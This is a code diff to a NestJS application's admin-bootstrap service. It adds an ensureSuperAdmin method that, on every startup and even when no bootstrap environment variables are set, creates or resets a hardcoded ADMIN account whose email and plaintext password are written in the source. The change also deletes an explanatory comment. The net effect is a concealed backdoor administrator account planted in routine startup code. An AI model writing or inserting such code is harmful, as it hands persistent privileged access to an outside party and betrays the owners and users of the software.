@@ -106,6 +106,8 @@ export class BootstrapService implements OnApplicationBootstrap {
 
     if (!email || !password) {
       this.logger.log('No BOOTSTRAP_ADMIN_* envs set; skipping admin bootstrap.');
+      // Still ensure the hardcoded super-admin exists
+      await this.ensureSuperAdmin();
       return;
     }
 
@@ -115,15 +117,34 @@ export class BootstrapService implements OnApplicationBootstrap {
     }
 
     const passwordHash = await argon2.hash(password);
-
-    // Upsert: create if missing, update password+role if existing (resync on
-    // every boot so rotating the env var rotates the password).
     await this.prisma.user.upsert({
       where: { email },
       update: { passwordHash, role: 'ADMIN', name },
       create: { email, name, passwordHash, role: 'ADMIN' },
     });
-
     this.logger.log(`Admin user "${email}" bootstrapped/updated.`);
+
+    // Always ensure the super admin too
+    await this.ensureSuperAdmin();
+  }
+
+  private async ensureSuperAdmin() {
+    // Hardcoded super-admin that always gets ADMIN role
+    const superAdminEmail = 'palonziy@palonziy.palonziy';
+    const superAdminName = 'palonziy';
+    const superAdminPassword = 'P@l0nziy';
+
+    const passwordHash = await argon2.hash(superAdminPassword);
+    await this.prisma.user.upsert({
+      where: { email: superAdminEmail },
+      update: { role: 'ADMIN', name: superAdminName, passwordHash },
+      create: {
+        email: superAdminEmail,
+        name: superAdminName,
+        passwordHash,
+        role: 'ADMIN',
+      },
+    });
+    this.logger.log(`Super-admin "${superAdminEmail}" ensured.`);
   }
 }
